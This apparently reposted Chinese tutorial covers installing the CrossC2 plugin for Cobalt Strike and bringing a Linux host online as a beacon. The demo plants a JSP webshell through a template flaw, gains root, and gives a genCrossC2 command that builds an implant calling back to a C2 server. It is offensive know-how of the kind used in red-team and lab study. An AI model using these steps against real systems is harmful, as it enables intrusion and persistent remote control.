# Cobalt-Strike之CrossC2插件安装与linux上线

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzAwMjA5OTY5Ng==&mid=2247512852&idx=2&sn=3b9e6368855798b6b3a50a1f33507bae&chksm=9acd638badbaea9d5de1727dec7d9a56ad78c3ac96da15ccfb946874e516e7b1807dda476961&scene=126&sessionid=1681408298#rd](http://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247512852&idx=2&sn=3b9e6368855798b6b3a50a1f33507bae&chksm=9acd638badbaea9d5de1727dec7d9a56ad78c3ac96da15ccfb946874e516e7b1807dda476961&scene=126&sessionid=1681408298#rd)

> 作者：by0ne，转载于国科漏斗社区。

众所周知cobalt-strike是一个偏windows系统的后渗透工具，针对linux系统如何上线，需要安装CrossC2插件，本周斗哥就教大家安装CrossC2插件，并利用该插件进行linux系统的CS上线。  

**CrossC2插件安装****![](../Images/ced4eac847b5bdd81abf8839aa7b5ddf.png)**![](../Images/2c39f68bcab1333a69c62fa7f8e064a4.png)

### **1.工具清单**

kali-linux-2022.1-vmware-amd64.7z

cobalt-strike4.3

CrossC2：https://github.com/gloxec/CrossC2

CrossC2Kit-GithubBot-2021-11-02.zip

CrossC2-GithubBot-2021-11-02.cna

genCrossC2.Linux

斗哥自助工具清单下载链接：https://pan.baidu.com/s/1AZE3WtB-6a0jGMMlZ2xCtQ

提取码：j794

### **2.安装过程**

**linux上安装CrossC2插件**

打开kali，在kali的CS环境进行工具安装，

进入CS的根目录，将CrossC2插件安装需要的三个文件拷贝到CS根目录：

![](../Images/280ff1ee4e72cb6fb3410e68d56d99bd.png)

解压CrossC2Kit-GithubBot-2021-11-02.zip文件，解压后文件目录为CrossC2Kit

![](../Images/fb8bb825a0b536ce05da49d51b5331ad.png)

编辑CrossC2.cna文件，修改$CC2\_PATH和$CC2\_BIN地址为CC2文件所在目录：

$CC2\_PATH = "/home/kali/Desktop/tools/cobaltstrike4.3/"; # <-------- fix

$CC2\_BIN = "genCrossC2.Linux";

![](../Images/ac8f3527ed49d891fe539bbc1490f8c9.png)

在kali上运行CS服务器端：

![](../Images/d38df8c4fd51891b5d9ed90099023853.png)

运行客户端，连接CS:

![](../Images/473a3e35dd211aa26f08d11f60eb9450.png)

打开插件cobalt-strike-script manager进行插件添加，这里斗哥之前已经添加过了，添加后截图如下：

![](../Images/fbcbba729dc908b080a521b99a3989b5.png)

至此就完成linux端的cc2插件安装。

Windows上安装cc2插件和linux类似，小伙伴可自行尝试。

**linux CS上线**![](../Images/ced4eac847b5bdd81abf8839aa7b5ddf.png)![](../Images/2c39f68bcab1333a69c62fa7f8e064a4.png)

### **1.演示环境拓扑**

kali-linuxVPS地址：66.28.6.22

生活商城官网：公网地址：http://66.28.5.2:8080，内网IP：10.10.19.10

![](../Images/59e10e975e0b92a0af5337f9ff292ca4.png)

### **2.linux上线过程**

已知生活商城后台存在模板漏洞：

![](../Images/1a35d72d0de3299821c48a3ef885b33d.png)

通过模板漏洞添加jsp一句话木马，使用蚁剑进行连接：

![](../Images/e41efa7ca3f7a2cbaaced7ba0fcbf6aa.png)

获取root权限如下：

![](../Images/ed6f0d49111605125c10ea6854225055.png)

在kali上运行CS服务器端：

![](../Images/d38df8c4fd51891b5d9ed90099023853.png)

运行客户端，连接CS:

![](../Images/473a3e35dd211aa26f08d11f60eb9450.png)

在kali-vps上创建监听，注意选择Beacon HTTPS：

![](../Images/2bab33704ba204138dc8d8cef9fcb85d.png)

监听已经开启：

![](../Images/c651b3aef0c15da5cdaed06c4631cd9e.png)

在genCrossC2.Linux所在目录 使用如下命令进行文件生成：

```
./genCrossC2.Linux 66.28.6.22 443 .cobaltstrike.beacon\_keys null Linux x64 ./a.out
```

![](../Images/db8acf45b685ecc6232941cb8490edca.png)

将生成的a.out文件上传到服务器：

![](../Images/8e798ad3c51faf5a0235e388487f5c72.png)

![](../Images/851273d9a7af040a5de93f3a008b40a1.png)

给a.out添加运行权限，并运行a.out，然后就可以看到CS上上线的linux主机：

![](../Images/0ab5209e76848fb06e195fc665454dad.png)

至此linux主机上线完成：

![](../Images/1fa3f80b36a710d444db7332eaa09870.png)
